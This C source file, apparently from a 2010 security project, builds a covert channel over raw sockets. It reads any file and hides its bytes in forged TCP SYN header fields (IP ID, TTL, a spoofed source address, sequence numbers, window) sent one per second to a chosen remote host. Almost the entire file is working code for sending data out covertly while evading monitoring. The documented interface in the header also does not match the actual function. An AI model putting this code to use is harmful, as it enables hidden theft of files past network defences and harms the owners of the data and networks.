/*------------------------------------------------------------------------------
--	SOURCE FILE:	covert.c - Functions for building covert channels using raw
--                  sockets
--
--	PROGRAM:		
--
--	FUNCTIONS:		Berkeley Socket API
--
--	DATE:			June 23rd 2010
--
--	REVISIONS:		
--
--	DESIGNERS:		Tajinder Thind
--
--	PROGRAMMERS:	Tajinder Thind
--
--	NOTES:
--	This source file contains generic functions for building raw packets and
--  sending/recieving them.
------------------------------------------------------------------------------*/

#include <string.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include "covert.h"

/*------------------------------------------------------------------------------
-- FUNCTION: SendCovertData
--
-- DATE: June 23rd 2010
--
-- REVISIONS:
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE:int SendCovertData(char* payload, int length, int sd, int protocol)
--
-- RETURNS: int, 1 if send completed successfully 0 if not
--
-- NOTES:   Sends payload covertly to sd by constructing raw packets based on 
--          the protocol selected. Packets are constructed and sent until the
--          end of the payload is reached indicated by length.
-- 
------------------------------------------------------------------------------*/
int SendCovertData(char *filename,int fsize, char* dip, int dport, int protocol)
{
    struct send_tcp* pkt;
    unsigned char* payload;
    char string[TCPIPMAXBYTES+1];
    struct sockaddr_in sin;
    int pos = 0,size=0, sd,fd;
    ssize_t bytesRead = 0;
    
    if((fd = open(filename, O_RDONLY)) == -1)
	{
		//perror("Error opening file");
		return 0;
	}
    
    /*Populate socket struct*/
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = host_convert(dip);
    
    //Send filesize
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("Error creating socket for sending?");
        return 0;
    }
    
    bzero(string,TCPIPMAXBYTES+1);
    memcpy(string,&fsize,2);
    pkt = ConstructTCP(string,dip,dport);
    
    if((sendto(sd, pkt, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) == -1)
    {
        perror("Error sending size");
        return 0;
    }
    //printf("Filesize:%d,%d",fsize,pkt->ip.id);
    close(sd);
    
    //while there remains payload to send
    while(1)
    {
        bzero(string,TCPIPMAXBYTES+1);
        bytesRead = read(fd, &string, TCPIPMAXBYTES);
        
        if(bytesRead == 0)
            break;

        //construct packet
        pkt = ConstructTCP(string,dip,dport);        
		
		/*Create raw socket for sending */
		if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
		{
			perror("Error creating socket for sending?");
			return 0;
		}
        
        if((sendto(sd, pkt, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) == -1)
        {
            perror("Error sending");
            return 0;
        }
            
        close(sd);
        sleep(1);
    }
    close(fd);
    return 1;
}

struct send_tcp* ConstructTCP(unsigned char* payload,char* dip, int dport)
{
    struct send_tcp* pkt;
    struct pseudo_header ph;
    unsigned int saddr=0,daddr=0;
    unsigned char* ptr;
    
    ptr = payload;
    pkt = malloc(sizeof(struct send_tcp));
    //printf("%s\n",payload);
    
    //Populate IP Header
    pkt->ip.ihl = 5;
    pkt->ip.version = 4;
    pkt->ip.tot_len = htons(40);
    pkt->ip.frag_off = 0;
    pkt->ip.protocol = 6;
    pkt->ip.check = 0;//must calculate checksum
    daddr=host_convert(dip);
    pkt->ip.daddr = daddr;
    pkt->ip.tos = 0;
    pkt->tcp.dest = htons(dport);
    pkt->tcp.res1 = 0;
    pkt->tcp.doff = 5;
    pkt->tcp.fin = 0;
    pkt->tcp.syn = 1;
    pkt->tcp.rst = 0;
    pkt->tcp.psh = 0;
    pkt->tcp.ack = 0;
    pkt->tcp.urg = 0;
    pkt->tcp.res2 = 0;
    pkt->tcp.check = 0;
    
    memcpy(&(pkt->ip.id),ptr,2);
    ptr +=2;

    memcpy(&(pkt->ip.ttl),ptr,1);
    ptr +=1;

    memcpy(&(pkt->ip.saddr),ptr,4);
    ptr +=4;

    memcpy(&(pkt->tcp.source),ptr,2);
    ptr +=2;

    memcpy(&(pkt->tcp.seq),ptr,4);
    ptr +=4;

    memcpy(&(pkt->tcp.ack_seq),ptr,4);
    ptr +=4;

    memcpy(&(pkt->tcp.window),ptr,2);
    ptr +=2;

    memcpy(&(pkt->tcp.urg_ptr),ptr,2);

    //Checksum
	pkt->ip.check = in_cksum((unsigned short *)&pkt->ip, 20);
    
    //From synhose.c by knight
    ph.source_address = pkt->ip.saddr;
    ph.dest_address = pkt->ip.daddr;
    ph.placeholder = 0;
    ph.protocol = IPPROTO_TCP;
    ph.tcp_length = htons(20);

    bcopy((char *)&pkt->tcp, (char *)&ph.tcp, 20);
    
    //Final checksum on the entire package
    pkt->tcp.check = in_cksum((unsigned short *)&ph, 32);
        
    return pkt;
}

/* Generic resolver from unknown source */
unsigned int host_convert(char *hostname)
{
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if(i.s_addr == -1)
	{
		h = gethostbyname(hostname);
		if(h == NULL)
		{
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
	}
	return i.s_addr;
} /* end resolver */

/* clipped from ping.c (this function is the whore of checksum routines */
/* as everyone seems to use it..I feel so dirty...) */

/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long		sum;		/* assumes long == 32 bits */
	u_short			oddbyte;
	register u_short	answer;		/* assumes u_short == 16 bits */

	/*
	* Our algorithm is simple, using a 32-bit accumulator (sum),
	* we add sequential 16-bit words to it, and at the end, fold back
	* all the carry bits from the top 16 bits into the lower 16 bits.
	*/

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1)
	{
		oddbyte = 0;		/* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	* Add back carry outs from top 16 bits to low 16 bits.
	*/
	sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */

	return(answer);
} /* end in_cksm()*/
